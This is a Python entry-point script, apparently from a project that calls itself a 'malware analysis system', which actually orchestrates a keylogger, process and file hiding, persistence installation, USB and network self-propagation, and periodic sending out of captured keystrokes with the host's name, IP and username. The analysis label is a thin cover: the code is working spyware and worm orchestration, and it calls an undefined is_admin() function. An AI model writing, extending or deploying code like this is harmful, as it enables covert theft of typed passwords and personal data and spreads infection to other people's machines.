"""
Main Entry Point
Orchestrates all modules and starts the analysis system
"""

import sys
import os
import threading
import time
from datetime import datetime
import logging

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import all modules
from config import Config
from core import Keylogger, EnhancedDetector, AdvancedAnalyzer, StealthManager, EncryptionManager
from transmission import HybridTransmission
from spread import USBSpread, NetworkSpread, PersistenceMechanisms
from dashboard import WebDashboard
from utils import setup_logging, get_system_info

class MalwareAnalysisSystem:
    """Complete malware analysis system"""
    
    def __init__(self):
        # Setup logging
        self.logger = setup_logging(Config.LOGGING_CONFIG)
        self.logger.info("=" * 60)
        self.logger.info("MALWARE ANALYSIS SYSTEM STARTING")
        self.logger.info("=" * 60)
        
        # System info
        self.system_info = get_system_info()
        self.logger.info(f"System: {self.system_info['hostname']} ({self.system_info['ip']})")
        self.logger.info(f"User: {self.system_info['username']}")
        
        # Initialize components
        self._init_components()
        
        # State
        self.running = False
        self.start_time = datetime.now()
        
        self.logger.info("[✓] System initialized")
    
    def _init_components(self):
        """Initialize all components"""
        
        # Core components
        self.keylogger = Keylogger()
        self.detector = EnhancedDetector(Config.PATHS['analysis_dir'])
        self.analyzer = AdvancedAnalyzer(Config.PATHS['analysis_dir'])
        self.stealth = StealthManager()
        self.encryption = EncryptionManager()
        
        # Transmission
        self.transmitter = HybridTransmission()
        
        # Spread mechanisms
        self.usb_spread = USBSpread()
        self.network_spread = NetworkSpread()
        self.persistence = PersistenceMechanisms()
        
        # Dashboard
        self.dashboard = WebDashboard(Config.PATHS['analysis_dir'])
        
        self.logger.info("[✓] All components initialized")
    
    def start(self):
        """Start the analysis system"""
        if self.running:
            return
        
        self.running = True
        
        # Apply stealth
        if Config.STEALTH_CONFIG['hide_process']:
            self.stealth.apply_stealth()
        
        # Install persistence
        if Config.SPREAD_CONFIG['persistence']:
            self.persistence.install()
        
        # Start keylogger
        self.keylogger.start()
        
        # Start dashboard
        dashboard_thread = threading.Thread(
            target=self.dashboard.run,
            args=('127.0.0.1', 5000),
            daemon=True
        )
        dashboard_thread.start()
        
        # Start processing loop
        self.process_thread = threading.Thread(
            target=self._process_loop,
            daemon=True
        )
        self.process_thread.start()
        
        # Start spread mechanisms
        if Config.SPREAD_CONFIG['usb_infection']:
            threading.Thread(target=self.usb_spread.infect, daemon=True).start()
        
        if Config.SPREAD_CONFIG['network_scanning']:
            threading.Thread(target=self.network_spread.scan_and_spread, daemon=True).start()
        
        self.logger.info("[✓] System started")
        self.logger.info(f"[*] Dashboard available at http://127.0.0.1:5000")
    
    def _process_loop(self):
        """Main processing loop"""
        batch_size = 50
        batch = []
        
        while self.running:
            # Get keystroke
            keystroke = self.keylogger.get_keystroke(timeout=1)
            
            if keystroke:
                batch.append(keystroke)
                
                # Update dashboard
                self.dashboard.update_data(keystroke)
                
                # Encrypt if enabled
                if Config.ENCRYPTION_CONFIG['enabled']:
                    self.encryption.encrypt_data(str(keystroke))
            
            # Process batch
            if len(batch) >= batch_size:
                self._process_batch(batch)
                batch = []
            
            # Periodically transmit data
            if len(self.dashboard.data['keystrokes']) % 100 == 0:
                self._transmit_data()
    
    def _process_batch(self, batch):
        """Process a batch of keystrokes"""
        try:
            # Detect threats
            detection = self.detector.analyze(batch)
            
            # Advanced analysis
            analysis = self.analyzer.analyze(batch)
            
            # Log threats
            if detection['threats']:
                for threat in detection['threats']:
                    self.logger.warning(f"[!] Threat: {threat['type']} - {threat['matched']}")
                    self.dashboard.update_data(
                        batch[-1] if batch else {},
                        threat
                    )
            
            # Check risk level
            if detection['risk_score'] > Config.ANALYSIS_CONFIG['risk_threshold']:
                self.logger.warning(f"[!] High risk detected: {detection['risk_score']}")
            
        except Exception as e:
            self.logger.error(f"Batch processing failed: {e}")
    
    def _transmit_data(self):
        """Transmit data using hybrid approach"""
        try:
            # Prepare data
            data = {
                'session_id': Config.SESSION_ID,
                'timestamp': datetime.now().isoformat(),
                'system_info': self.system_info,
                'keystrokes': self.dashboard.data['keystrokes'][-100:],
                'threats': self.dashboard.data['threats'],
                'stats': self.dashboard.data['stats']
            }
            
            # Convert to JSON
            import json
            json_data = json.dumps(data)
            
            # Transmit
            self.transmitter.send(json_data)
            
        except Exception as e:
            self.logger.error(f"Transmission failed: {e}")
    
    def stop(self):
        """Stop the analysis system"""
        self.running = False
        
        # Stop keylogger
        self.keylogger.stop()
        
        # Clean traces
        if Config.STEALTH_CONFIG['hide_files']:
            self.stealth.clean_traces()
        
        self.logger.info("[✓] System stopped")
    
    def generate_report(self):
        """Generate final report"""
        report_path = os.path.join(Config.PATHS['analysis_dir'], 'final_report.txt')
        
        with open(report_path, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("MALWARE ANALYSIS REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Session ID: {Config.SESSION_ID}\n")
            f.write(f"Start Time: {self.start_time}\n")
            f.write(f"End Time: {datetime.now()}\n")
            f.write(f"Total Keystrokes: {self.keylogger.key_count}\n")
            f.write(f"Threats Detected: {len(self.dashboard.data['threats'])}\n")
            f.write(f"Risk Level: {self.dashboard.data['stats']['risk_level']}\n")
            f.write(f"Analysis Directory: {Config.PATHS['analysis_dir']}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("SYSTEM INFORMATION\n")
            f.write("-" * 40 + "\n")
            for key, value in self.system_info.items():
                f.write(f"{key}: {value}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("DETECTED THREATS\n")
            f.write("-" * 40 + "\n")
            for threat in self.dashboard.data['threats']:
                f.write(f"{threat['timestamp']}: {threat['type']} - {threat['matched']}\n")
        
        self.logger.info(f"[✓] Report generated: {report_path}")

def main():
    """Main entry point"""
    # Check admin privileges
    if not is_admin():
        print("Warning: Not running as administrator. Some features may not work.")
    
    # Create system
    system = MalwareAnalysisSystem()
    
    # Start system
    system.start()
    
    print("\n" + "=" * 60)
    print("MALWARE ANALYSIS SYSTEM RUNNING")
    print("=" * 60)
    print(f"Dashboard: http://127.0.0.1:5000")
    print(f"Analysis Directory: {Config.PATHS['analysis_dir']}")
    print("Press Ctrl+C to stop\n")
    
    try:
        # Keep running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping system...")
        system.stop()
        system.generate_report()
        print("[✓] System stopped. Report generated.")
        sys.exit(0)

if __name__ == "__main__":
    main()